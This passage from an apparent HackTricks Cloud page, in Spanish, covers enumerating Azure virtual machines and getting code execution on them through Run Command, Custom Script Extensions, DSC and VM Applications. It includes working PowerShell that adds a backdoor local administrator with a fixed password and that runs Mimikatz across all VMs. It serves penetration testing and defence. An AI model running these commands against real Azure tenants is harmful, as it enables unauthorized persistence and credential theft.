# Az - Máquinas Virtuales

<details>

<summary><strong>¡Apoya a HackTricks y obtén beneficios!</strong></summary>

* Si quieres ver a tu **empresa anunciada en HackTricks** o si quieres acceder a la **última versión de PEASS o descargar HackTricks en PDF** ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos.
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Información básica

Las máquinas virtuales de Azure son uno de varios tipos de recursos informáticos escalables bajo demanda que ofrece Azure. Por lo general, se elige una máquina virtual cuando se necesita más control sobre el entorno informático que las otras opciones ofrecen. Este artículo le proporciona información sobre lo que debe considerar antes de crear una máquina virtual, cómo crearla y cómo administrarla.

## Enumeración

```powershell
# Obtener VMs legibles
Get-AzVM | fl
# Listar VMs en ejecución
Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | fl *
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | select -ExpandProperty NetworkProfile

# Obtener interfaz y dirección IP
Get-AzNetworkInterface -Name <interface_name>
Get-AzPublicIpAddress -Name <iface_public_ip_id>

# Obtener extensiones instaladas
Get-AzVMExtension -ResourceGroupName <res_group_name> -VMName <name>

Get-AzVM | select -ExpandProperty NetworkProfile # Obtener el nombre del conector de red de la VM
Get-AzNetworkInterface -Name <name> # Obtener información del conector de red (como la IP)
```

## **Ejecutar comandos en una VM**

### **Comando Ejecutar**

```powershell
# El permiso que permite esto es Microsoft.Compute/virtualMachines/runCommand/action
Invoke-AzVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' –Verbose
## Otra forma
Invoke-AzureRmVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' –Verbose

# Contenido del script
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
New-LocalUser -Name new_user -Password $passwd 
Add-LocalGroupMember -Group Administrators -Member new_user
```

```powershell
# Intentar ejecutar en todas las máquinas
Import-module MicroBurst.psm1
Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
```

### **Extensión de script personalizado**

Las extensiones de máquina virtual (VM) de Azure son **pequeñas aplicaciones** que proporcionan configuración posterior a la implementación y tareas de automatización en **VM de Azure**. Por ejemplo, si una máquina virtual requiere la instalación de software, protección antivirus o la capacidad de ejecutar un script dentro de ella, puede usar una extensión de VM.

Por lo tanto, si tiene acceso para escribirlo, puede ejecutar código arbitrario:

```powershell
# Microsoft.Compute/virtualMachines/extensions/write
Set-AzVMExtension -ResourceGroupName "Research" -ExtensionName "ExecCmd" -VMName "infradminsrv" -Location "Germany West Central" -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users new_user Welcome2022. /add /Y; net localgroup administrators new_user /add"}'
```

### DesiredConfigurationState

**DesiredConfigurationState (DSC)** es similar a Ansible, pero es una herramienta dentro de PowerShell que permite configurar un host a través del código. DSC tiene su propia extensión en Azure que permite la carga de archivos de **configuración** de DSC. Los archivos de configuración de DSC son bastante quisquillosos en cuanto a la sintaxis, sin embargo, la extensión de DSC es muy crédula y ejecutará **ciegamente cualquier comando** siempre y cuando siga un cierto formato, como se muestra en la figura 5.

<figure><img src="../../.gitbook/assets/image (85).png" alt=""><figcaption></figcaption></figure>

Esto se puede hacer a través de la función de PowerShell de **Az [**`Publish-AzvmdscConfiguration`**](https://docs.microsoft.com/en-us/powershell/module/az.compute/publish-azvmdscconfiguration?view=azps-7.5.0)**. La extensión de DSC requiere un archivo **.PS1** con una **función** y **empaquetado** en un archivo **.zip**. Dado que esto no es realmente la sintaxis correcta de DSC, el estado de la extensión se leerá como "fallido", sin embargo, el código se ejecutará. El problema con esto es que no hay salida del comando, ya que el estado se sobrescribe con el mensaje de falla.

### Definiciones de aplicaciones de VM

El recurso [Aplicaciones de VM](https://docs.microsoft.com/en-us/azure/virtual-machines/vm-applications) es una forma de **implementar aplicaciones versionadas de manera repetible** en una VM de Azure. Por ejemplo, si crea un **programa** y lo implementa en todas las VM de Azure como la versión 1.0, una vez que **actualice** el programa a la versión 1.1, puede usar la misma Aplicación de VM para **crear otra definición** y enviar la actualización a cualquier VM.\
Poder **enviar una aplicación** a una VM significa que es otra vía para la **ejec